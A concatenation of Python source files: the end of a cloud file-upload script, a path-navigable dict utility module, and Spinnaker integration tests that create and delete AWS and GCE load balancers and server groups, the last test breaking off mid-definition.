            driver.upload_object(local_path,container,file_name,extra=extra_settings)
        except:
            print "\n*** Unexpected error", sys.exc_info()[0] , " ***\n"
            #raise
            errorcode = sys.exc_info()[0]
            errorloggystring = ('An unexpected Error ' + 'occurred on file: ' + file_name + ' in folder' + local_path)
            logging.info(errorloggystring)
            logging.info(errorcode)
            errorcount = errorcount + 1

endloggystring = "\n*** END UPLOAD PROCESS ***\n"
logging.info(endloggystring)

showcloudassets()

print 'Process complete. ', errorcount, ' error(s) were found. \nSee the logfile: ', logfilename, ' for details.'

import collections.abc
__version__ = "0.3"

MISSING = object()
DEFAULT_PATH_SEPARATOR = "."


def raise_on_missing(sep, visited, **kwargs):
    """Raise the full path of the missing key"""
    raise KeyError(sep.join(visited))


def create_on_missing(factory):
    """
    Returns a function to pass to traverse to create missing nodes.

    Usage
    -----
    # This will insert dicts on missing keys
    root = {}
    path = "hello.world.foo.bar"
    on_missing = create_on_missing(dict)
    node, last = traverse(root, path, sep=".", on_missing=on_missing)
    print(root)  # {"hello": {"world": {"foo": {}}}}
    print(node)  # {}
    print(last)  # "bar"
    assert root["hello"]["world"]["foo"] is node
    """
    def on_missing(**kwargs):
        return factory()
    return on_missing


def default_context_factory():
    """
    By default, Context creates a PathDict for each context.

    Each of those PathDicts will use regular dicts for storage.
    """
    return lambda: PathDict(path_factory=dict,
                            path_separator=DEFAULT_PATH_SEPARATOR)


def traverse(root, path, sep, on_missing=raise_on_missing):                    
    """
    Returns a (node, key) of the last node in the chain and its key.

    sep: splitting character in the path
    on_missing: func that takes (node, key, visited, sep) and returns a
                new value for the missing key or raises.
    """
    visited = []
    node = root
    *segments, last = path.split(sep)
    for segment in segments:
        # Skip empty segments - collapse "foo..bar.baz" into "foo.bar.baz"
        if not segment:
            continue
        visited.append(segment)
        child = node.get(segment, MISSING)
        if child is MISSING:
            # pass by keyword so functions may ignore variables
            new = on_missing(node=node, key=segment, visited=visited, sep=sep)
            # insert new node if the on_missing function didn't raise
            child = node[segment] = new
        node = child
    return [node, last]


class PathDict(collections.abc.MutableMapping):
    """Path navigable dict, inserts missing nodes during set.

    Args:
        path_separator (Optional[str]):
            string that separates each segment of
            a path.  Defaults to "."
        path_factory (Callable[[], collections.abc.MutableMapping]):
            no-arg function that returns an object that implements the
            mapping interface.  Used to fill missing segments when
            setting values.  Defaults to dict.

    Usage:

        >>> config = PathDict(path_separator="/")
        >>> config["~/ws/texas"] = ["tox.ini", ".travis.yml"]
        >>> config["~/ws/bloop"] = [".gitignore"]
        >>> print(config["~/ws"])
        {'bloop': ['.gitignore'], 'texas': ['tox.ini', '.travis.yml']}

    """
    def __init__(self, *args,
                 path_separator=DEFAULT_PATH_SEPARATOR,
                 path_factory=dict,
                 **kwargs):
        self._sep = path_separator
        self._data = {}
        self._create_on_missing = create_on_missing(path_factory)
        self.update(*args, **kwargs)

    def __setitem__(self, path, value):
        node, key = traverse(self, path, sep=self._sep,                    
                             on_missing=self._create_on_missing)                    
        if node is self:                    
            self._data[key] = value                    
        else:
            node[key] = value

    def __getitem__(self, path):
        node, key = traverse(self, path, sep=self._sep,                    
                             on_missing=raise_on_missing)                    
        if node is self:                    
            return self._data[key]                    
        else:
            return node[key]

    def __delitem__(self, path):
        node, key = traverse(self, path, sep=self._sep,                    
                             on_missing=raise_on_missing)                    
        if node is self:                    
            del self._data[key]                    
        else:
            del node[key]

    def __iter__(self):
        return iter(self._data)

    def __len__(self):
        return len(self._data)

    def __repr__(self):  # pragma: no cover
        return "PathDict(" + repr(dict(self)) + ")"


class Context:
    def __init__(self, factory=None):
        self._factory = factory or default_context_factory()
        self._contexts = self._factory()

    def _get_context(self, name):
        try:
            return self._contexts[name]
        except KeyError:
            context = self._contexts[name] = self._factory()
            return context

    def include(self, *names, contexts=None):
        contexts = list(contexts) if (contexts is not None) else []
        contexts.extend(self._get_context(name) for name in names)
        return ContextView(self, contexts)


class ContextView(collections.abc.MutableMapping):
    def __init__(self, context, contexts):
        self.contexts = contexts
        self.context = context

    def __enter__(self):
        return self

    def __exit__(self, *args):
        pass

    @property
    def current(self):
        return self.contexts[-1]

    def include(self, *names):
        return self.context.include(*names, contexts=self.contexts)

    def __getitem__(self, path):
        for context in reversed(self.contexts):
            value = context.get(path, MISSING)
            if value is not MISSING:
                return value
        raise KeyError(path)

    def __setitem__(self, path, value):
        self.current[path] = value

    def __delitem__(self, path):
        del self.current[path]

    def __len__(self):
        return len(self.current)

    def __iter__(self):
        return iter(self.current)

# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Tests to see if CloudDriver/Kato can interoperate with Amazon Web Services.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)
    and $AWS_PROFILE is the name of the aws_cli profile for authenticating
    to observe aws resources:

    This first command would be used if Spinnaker itself was deployed on GCE.
    The test needs to talk to GCE to get to spinnaker (using the gce_* params)
    then talk to AWS (using the aws_profile with the aws cli program) to
    verify Spinnaker had the right effects on AWS.

    PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
       --gce_project=$PROJECT \
       --gce_zone=$GCE_ZONE \
       --gce_instance=$INSTANCE \
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   or

     This second command would be used if Spinnaker itself was deployed some
     place reachable through a direct IP connection. It could be, but is not
     necessarily deployed on GCE. It is similar to above except it does not
     need to go through GCE and its firewalls to locate the actual IP endpoints
     rather those are already known and accessible.

     PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --native_hostname=host-running-kato
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   Note that the $AWS_ZONE is not directly used, rather it is a standard
   parameter being used to infer the region. The test is going to pick
   some different availability zones within the region in order to test kato.
   These are currently hardcoded in.
"""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc                    
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class AwsKatoTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the test.

  This scenario defines the different test operations.
  We're going to:
    Create a Load Balancer
    Delete a Load Balancer
  """

  __use_lb_name = ''     # The load balancer name.

  @classmethod
  def new_agent(cls, bindings):
    """Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """
    return kato.new_agent(bindings)

  def upsert_load_balancer(self):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.
    """
    detail_raw_name = 'katotestlb' + self.test_id
    self.__use_lb_name = detail_raw_name

    bindings = self.bindings
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    listener = {
        'Listener': {
            'InstancePort':7001,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold':8,
        'UnhealthyThreshold':3,
        'Interval':123,
        'Timeout':12,
        'Target':'HTTP:%d/healthcheck' % listener['Listener']['InstancePort']
    }

    payload = self.agent.type_to_payload(
        'upsertAmazonLoadBalancerDescription',
        {
            'credentials': bindings['AWS_CREDENTIALS'],
            'clusterName': bindings['TEST_APP'],
            'name': detail_raw_name,
            'availabilityZones': {region: avail_zones},
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold']
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=30)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name])
     .contains_pred_list([
         jc.PathContainsPredicate(                    
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(                    
             'LoadBalancerDescriptions/AvailabilityZones',                    
             jc.LIST_SIMILAR(avail_zones)),                    
         jc.PathElementsContainPredicate(                    
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_load_balancer(self):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.
    """
    region = self.bindings['TEST_AWS_REGION']
    payload = self.agent.type_to_payload(
        'deleteAmazonLoadBalancerDescription',
        {
            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [region],
            'loadBalancerName': self.__use_lb_name
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', self.__use_lb_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())


class AwsKatoIntegrationTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsKatoTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_APP': 'awskatotest' + AwsKatoTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsKatoTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2016 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Smoke test to see if Spinnaker can interoperate with Amazon Web Services.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --native_hostname=host-running-smoke-test
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE

  Note that the $AWS_ZONE is not directly used, rather it is a standard
  parameter being used to infer the region. The test is going to pick
  some different availability zones within the region in order to test kato.
  These are currently hardcoded in.
"""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class AwsSmokeTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """

  @classmethod
  def new_agent(cls, bindings):
    """Implements citest.service_testing.AgentTestScenario.new_agent."""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """
    super(AwsSmokeTestScenario, cls).initArgumentParser(parser,
                                                        defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """
    super(AwsSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """Creates OperationContract that creates a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """Creates OperationContract that deletes a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self, use_vpc):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.

    Args:
      use_vpc: [bool] if True configure a VPC otherwise dont.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # We're assuming that the given region has 'A' and 'B' availability
    # zones. This seems conservative but might be brittle since we permit
    # any region.
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    if use_vpc:
      # TODO(ewiseblatt): 20160301
      # We're hardcoding the VPC here, but not sure which we really want.
      # I think this comes from the spinnaker.io installation instructions.
      # What's interesting about this is that it is a 10.* CidrBlock,
      # as opposed to the others, which are public IPs. All this is sensitive
      # as to where the TEST_AWS_VPC_ID came from so this is going to be
      # brittle. Ideally we only need to know the vpc_id and can figure the
      # rest out based on what we have available.
      subnet_type = 'internal (defaultvpc)'
      vpc_id = bindings['TEST_AWS_VPC_ID']

      # Not really sure how to determine this value in general.
      security_groups = ['default']

      # The resulting load balancer will only be available in the zone of
      # the subnet we are using. We'll figure that out by looking up the
      # subnet we want.
      subnet_details = self.aws_observer.get_resource_list(
          root_key='Subnets',
          aws_command='describe-subnets',
          aws_module='ec2',
          args=['--filters',
                'Name=vpc-id,Values={vpc_id}'
                ',Name=tag:Name,Values=defaultvpc.internal.{region}'
                .format(vpc_id=vpc_id, region=region)])
      try:
        expect_avail_zones = [subnet_details[0]['AvailabilityZone']]
      except KeyError:
        raise ValueError('vpc_id={0} appears to be unknown'.format(vpc_id))
    else:
      subnet_type = ""
      vpc_id = None
      security_groups = None
      expect_avail_zones = avail_zones

      # This will be a second load balancer not used in other tests.
      # Decorate the name so as not to confuse it.
      load_balancer_name += '-pub'


    listener = {
        'Listener': {
            'InstancePort':80,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold': 8,
        'UnhealthyThreshold': 3,
        'Interval': 12,
        'Timeout': 6,
        'Target':'HTTP:%d/' % listener['Listener']['InstancePort']
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'upsertLoadBalancer',
            'cloudProvider': 'aws',
            # 'loadBalancerName': load_balancer_name,


            'credentials': bindings['AWS_CREDENTIALS'],
            'name': load_balancer_name,
            'stack': bindings['TEST_STACK'],
            'detail': '',
            'region': bindings['TEST_AWS_REGION'],

            'availabilityZones': {region: avail_zones},
            'regionZones': avail_zones,
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthCheckProtocol': 'HTTP',
            'healthCheckPort': listener['Listener']['LoadBalancerPort'],
            'healthCheckPath': '/',
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold'],

            'user': '[anonymous]',
            'usePreferredZones': True,
            'vpcId': vpc_id,
            'subnetType': subnet_type,
            # If I set security group to this then I get an error it is missing.
            # bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'securityGroups': security_groups
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=10)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name])
     .contains_pred_list([
         jc.PathContainsPredicate(                    
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(                    
             'LoadBalancerDescriptions/AvailabilityZones',                    
             jc.LIST_SIMILAR(expect_avail_zones)),                    
         jc.PathElementsContainPredicate(                    
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self, use_vpc):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.

    Args:
      use_vpc: [bool] if True delete the VPC load balancer, otherwise
         the non-VPC load balancer.
    """
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    if not use_vpc:
      # This is the second load balancer, where we decorated the name in upsert.
      load_balancer_name += '-pub'

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'aws',

            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [self.bindings['TEST_AWS_REGION']],
            'loadBalancerName': load_balancer_name
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            self.bindings['AWS_CREDENTIALS'],
            self.bindings['TEST_AWS_REGION']),
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', load_balancer_name))

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """Creates OperationContract for createServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    for the server group was created.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'createServerGroup',
            'cloudProvider': 'aws',
            'application': self.TEST_APP,
            'credentials': bindings['AWS_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetHealthyDeployPercentage': 100,
            'loadBalancers': [load_balancer_name],
            'cooldown': 8,
            'healthCheckType': 'EC2',
            'healthCheckGracePeriod': 40,
            'instanceMonitoring': False,
            'ebsOptimized': False,
            'iamRole': bindings['AWS_IAM_ROLE'],
            'terminationPolicies': ['Default'],

            'availabilityZones': {region: avail_zones},
            'keyPair': bindings['AWS_CREDENTIALS'] + '-keypair',
            'suspendedProcesses': [],
            # TODO(ewiseblatt): Inquiring about how this value is determined.
            # It seems to be the "Name" tag value of one of the VPCs
            # but is not the default VPC, which is what we using as the VPC_ID.
            # So I suspect something is out of whack. This name comes from
            # spinnaker.io tutorial. But using the default vpc would probably
            # be more adaptive to the particular deployment.
            'subnetType': 'internal (defaultvpc)',
            'securityGroups': [bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'virtualizationType': 'paravirtual',
            'stack': bindings['TEST_STACK'],
            'freeFormDetails': '',
            'amiName': bindings['TEST_AWS_AMI'],
            'instanceType': 'm1.small',
            'useSourceCapacity': False,
            'account': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Server Group Added',
                                retryable_for_secs=30)
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name])
     .contains_path_value('AutoScalingGroups', {'MaxSize': 2}))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    is no longer visible on AWS (or is in the process of terminating).
    """
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'aws',
            'type': 'destroyServerGroup',
            'serverGroupName': group_name,
            'asgName': group_name,
            'region': bindings['TEST_AWS_REGION'],
            'regions': [bindings['TEST_AWS_REGION']],
            'credentials': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Scaling Group Removed')
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name],
                        no_resources_ok=True)
     .contains_path_value('AutoScalingGroups', {'MaxSize': 0}))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .collect_resources('ec2', 'describe-instances', no_resources_ok=True)
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class AwsSmokeTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsSmokeTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer_public(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=False))

  def test_b_upsert_load_balancer_vpc(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=True))

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer_vpc(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=True),
                       max_retries=5)

  def test_y_delete_load_balancer_pub(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=False),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_STACK': str(AwsSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'smoketest' + AwsSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsSmokeTest])


if __name__ == '__main__':
  sys.exit(main())


# Standard python modules.
import time
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc                    
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario):

  @classmethod
  def new_agent(cls, bindings):
    '''Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Gate.
      This is the agent that test operations will be posted to.
    '''
    return gate.new_agent(bindings)

  def __init__(self, bindings, agent=None):
    super(GoogleServerGroupTestScenario, self).__init__(bindings, agent)

    # Our application name and path to post events to.
    self.TEST_APP = bindings['TEST_APP']
    self.__path = 'applications/%s/tasks' % self.TEST_APP

    # The spinnaker stack decorator for our resources.
    self.TEST_STACK = bindings['TEST_STACK']

    self.TEST_REGION = bindings['TEST_GCE_REGION']
    self.TEST_ZONE = bindings['TEST_GCE_ZONE']

    # Resource names used among tests.
    self.__cluster_name = '%s-%s' % (self.TEST_APP, self.TEST_STACK)
    self.__server_group_name = '%s-v000' % self.__cluster_name
    self.__cloned_server_group_name = '%s-v001' % self.__cluster_name
    self.__lb_name = '%s-%s-fe' % (self.TEST_APP, self.TEST_STACK)

  def create_load_balancer(self):
    job = [{
      'cloudProvider': 'gce',
      'loadBalancerName': self.__lb_name,
      'ipProtocol': 'TCP',
      'portRange': '8080',
      'provider': 'gce',
      'stack': self.TEST_STACK,
      'detail': 'frontend',
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'region': self.TEST_REGION,
      'listeners': [{
        'protocol': 'TCP',
        'portRange': '8080',
        'healthCheck': False
      }],
      'name': self.__lb_name,
      'type': 'upsertLoadBalancer',
      'availabilityZones': {self.TEST_REGION: []},
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - create load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_load_balancer', data=payload, path=self.__path),
      contract=builder.build())

  def create_instances(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'zone': self.TEST_ZONE,
      'network': 'default',
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'availabilityZones': {
        self.TEST_REGION: [self.TEST_ZONE]
      },
      'loadBalancers': [self.__lb_name],
      'instanceMetadata': {
        'load-balancer-names': self.__lb_name
      },
      'cloudProvider': 'gce',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'instanceType': 'f1-micro',
      'initialNumReplicas': 1,
      'type': 'createServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instance Created', retryable_for_secs=150)
     .list_resources('instance-groups')
     .contains_path_value('name', self.__server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job,
        description='Server Group Test - create initial server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_instances', data=payload, path=self.__path),
      contract=builder.build())

  def resize_server_group(self):
    job = [{
      'targetSize': 2,
      'capacity': {
        'min': 2,
        'max': 2,
        'desired': 2
      },
      'replicaPoolName': self.__server_group_name,
      'numReplicas': 2,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'asgName': self.__server_group_name,
      'type': 'resizeServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'cloudProvider': 'gce',
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Resized', retryable_for_secs=90)
     .inspect_resource('instance-groups',
                       self.__server_group_name,
                       ['--zone', self.TEST_ZONE])
     .contains_path_eq('size', 2))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - resize to 2 instances',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='resize_instances', data=payload, path=self.__path),
      contract=builder.build())

  def clone_server_group(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'loadBalancers': [self.__lb_name],
